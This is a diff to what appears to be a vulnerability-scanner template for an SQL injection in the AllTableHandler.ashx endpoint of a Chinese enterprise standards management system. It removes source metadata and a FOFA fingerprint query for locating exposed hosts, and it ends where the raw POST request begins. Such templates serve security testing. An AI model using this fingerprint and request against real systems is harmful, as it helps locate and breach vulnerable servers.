@@ -3,12 +3,8 @@ info:
   name: 润申信息企业标准化管理系统 AllTableHandler.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xi0zuloi4ge6q7e7'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xi0zuloi4ge6q7e7
-    fofa: body="PDCA/js/_publicCom.js"
 http:
 - raw:
   - 'POST /PDCA/ashx/AllTableHandler.ashx?action=GetAll HTTP/1.1
